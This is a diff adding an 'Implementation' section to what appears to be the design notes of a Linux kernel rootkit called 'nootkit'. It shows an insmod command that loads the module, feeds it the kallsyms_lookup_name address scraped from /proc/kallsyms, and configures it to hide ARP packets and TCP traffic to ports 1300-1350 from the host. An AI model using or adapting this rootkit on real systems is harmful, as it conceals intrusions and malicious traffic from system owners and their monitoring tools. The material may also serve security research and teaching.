@@ -206,3 +206,19 @@ static inline void __netif_receive_skb_list_ptype(struct list_head *head,
 
 Which seemed to be rather final in the flow. I can't tell for sure at the moment if we're not causing a memory leak,
 but I'll leave that as a TODO for now.
+
+## Implementation
+
+For the end implementation see [src/hide/net.c](../src/hide/net.c).
+
+I reused and updated the existing connection configuration mechanism to include all sorts of stuff we can filter packets by -
+here for example is how we can filter out all ARP packets, in addition to packets directed to TCP destination ports 1300-1350:
+
+```sh
+insmod /nootkit.ko \
+kallsyms_lookup_name=0x$(cat /proc/kallsyms | grep "\bkallsyms_lookup_name\b" | cut -d " " -f 1) \
+"hide_packets=\" \
+ETH PROTO = 0; ETH SRC = 00:00:00:00:00:00; ETH DST = 00:00:00:00:00:00; IP PROTO = 6; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:1300-1350;, \
+ETH PROTO = 0806; ETH SRC = 00:00:00:00:00:00; ETHDST = 00:00:00:00:00:00; IPPROTO = 0; IP SRC = 0.0.0.0/0.0.0.0:0-65535; IP DST = 0.0.0.0/0.0.0.0:0-65535; \
+\""
+```
